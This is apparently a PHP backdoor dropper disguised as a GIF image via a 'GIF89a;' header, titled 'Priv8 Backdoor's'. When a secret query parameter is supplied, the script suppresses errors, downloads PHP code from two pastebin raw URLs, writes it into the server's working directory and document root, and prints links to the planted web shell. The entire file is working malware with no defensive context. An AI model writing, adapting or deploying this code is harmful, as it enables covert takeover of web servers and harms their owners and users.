GIF89a;<title>Fuckedz By En Banglasia</title>
<?php
error_reporting(0);
$name = "Fuckedz.htm"; // Digunakan untuk nama file
$files = "https://pastebin.com/raw/TpTiu5du"; // Digunakan untuk file yang akan dipanggil
$secret = "Fuckedz"; // Digunakan untuk hidden file pada FGet Backdoor (contoh: victim.com/fget.php?0xbyt3)


if($_GET["$secret"] === '') {
	echo "<title>Priv8 Uploaders By En Banglasia</title>\n<style type=\"text/css\">body {background:#000000;font-family:'Courier';color:lime;}a{color:lime;text-decoration:none;}h1{text-align:center;margin:1;}</style>";
	echo "<h1>Priv8 Backdoor's</h1>";

	function shellone($name) {
		$filename = "cache_".md5($name).".php";
		$fget=file_get_contents("https://pastebin.com/raw/ntq2g95Z");
		$path=getcwd().DIRECTORY_SEPARATOR;
		$fileopen=fopen("$path/$filename",'w');  
		$execfile=fwrite($fileopen,$fget);
		$shellurl = $_SERVER['HTTPS'] ? "https" : "http" . "://$_SERVER[HTTP_HOST]".dirname($_SERVER[REQUEST_URI])."/$filename";
		    if($execfile)
		    {
		    	if(file_exists(getcwd()."/$filename")) {
					echo "<font color=\"#00FF00\">[OK!] <a href=\"$shellurl\" target=\"_blank\">$shellurl</a> <font color=\"#009900\">=> 0byt3m1n1 Shell</font></font>";
		        }
		        else {
		        	echo "<font color=\"red\">$path$filename<br>Doesn't exist!</font>";
		        }
		    }
		    else {
		        echo "<font color=\"red\">Failed get newfile $filename in $path</font>";
		    }
	}

	function shelltwo($name, $file) {
		$filename = $name;
		$fget=file_get_contents($file);
		$path=$_SERVER['DOCUMENT_ROOT'].DIRECTORY_SEPARATOR;
		$fileopen=fopen("$path/$filename",'w');  
		$execfile=fwrite($fileopen,$fget);
		$shellurl = $_SERVER['HTTPS'] ? "https" : "http" . "://$_SERVER[HTTP_HOST]"."/$filename";
		    if($execfile)
		    {
		    	if(file_exists($path."/$filename")) {
					echo "<font color=\"#00FF00\">[OK!] <a href=\"$shellurl\" target=\"_blank\">$shellurl</a></font>";
		        }
		        else {
		        	echo "<font color=\"red\">$path$filename<br>Doesn't exist!</font>";
		        }
		    }
		    else {
		        echo "<font color=\"red\">Failed get newfile $filename in $path</font>";
		    }
	}

	shellone($name);
	echo "<br>";
	shelltwo($name,$files);
}
?>
